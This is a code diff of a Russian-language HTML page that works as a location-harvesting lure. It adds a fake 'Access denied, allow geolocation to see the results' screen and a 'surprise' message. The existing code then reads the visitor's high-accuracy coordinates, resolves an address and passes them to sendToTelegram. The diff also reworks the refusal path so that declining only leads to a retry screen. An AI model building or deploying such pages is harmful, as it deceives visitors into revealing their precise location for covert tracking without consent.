@@ -212,10 +212,24 @@
             color: #8b949e;
             margin-top: 4px;
         }
+        .step2-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #f85149;
+        }
+        .step2-sub {
+            font-size: 16px;
+            color: #aaa;
+            margin-top: 8px;
+        }
+        .step2-btn {
+            margin-top: 30px;
+        }
     </style>
 </head>
 <body>
 
+    <!-- ЭКРАН 1: Чёрный + кнопка -->
     <div class="full-center" id="step1">
         <div class="card">
             <h1>🔐 Доступ</h1>
@@ -224,7 +238,17 @@
         </div>
     </div>
 
+    <!-- ЭКРАН 2: "Доступ запрещён" + запрос геолокации -->
     <div class="full-center hidden" id="step2">
+        <div class="card">
+            <div class="step2-title">⛔ Доступ запрещён</div>
+            <div class="step2-sub">Разрешите геолокацию, чтобы увидеть результаты</div>
+            <button class="btn step2-btn" id="allowBtn">Разрешить</button>
+        </div>
+    </div>
+
+    <!-- ЭКРАН 3: Сюрприз -->
+    <div class="full-center hidden" id="step3">
         <div class="card">
             <div class="surprise">🎉 Я скоро приду!</div>
             <div class="message-box">
@@ -253,11 +277,12 @@
         </div>
     </div>
 
-    <div class="full-center hidden" id="step3">
+    <!-- ЭКРАН 4: Заглушка при запрете -->
+    <div class="full-center hidden" id="step4">
         <div class="card">
             <div class="error-box">
                 <div class="error-text">⛔ Доступ запрещён</div>
-                <div class="error-sub">доступ к документам ограничен</div>
+                <div class="error-sub">Без геолокации я не могу показать, где я</div>
                 <button class="btn-small" onclick="goBack()">🔙 Попробовать снова</button>
             </div>
         </div>
@@ -349,7 +374,6 @@
                     const a = data.address;
                     place = a.tourism || a.shop || a.amenity || a.leisure || a.historic || a.building || a.place || a.suburb || a.city || a.town || a.village;
                     if (place) {
-                        // убираем лишние детали из названия
                         place = place.replace(/\([^)]*\)/g, '').trim();
                     }
                 }
@@ -375,7 +399,7 @@
             placeEl.textContent = '';
 
             if (!navigator.geolocation) {
-                showError();
+                showFinalError();
                 return;
             }
 
@@ -416,25 +440,32 @@
                     sendToTelegram(lat, lon, accuracy, place, address);
                 },
                 function(err) {
-                    showError();
+                    showFinalError();
                 },
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
             );
         }
 
-        function showError() {
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step3').classList.remove('hidden');
+        function showFinalError() {
+            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('step4').classList.remove('hidden');
         }
 
         function goBack() {
-            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('step4').classList.add('hidden');
             document.getElementById('step1').classList.remove('hidden');
         }
 
+        // Шаг 1 → Шаг 2
         document.getElementById('startBtn').addEventListener('click', function() {
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
+        });
+
+        // Шаг 2 → Шаг 3 (с запросом геолокации)
+        document.getElementById('allowBtn').addEventListener('click', function() {
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
 
             map = L.map('map').setView([55.7558, 37.6173], 13);
             L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
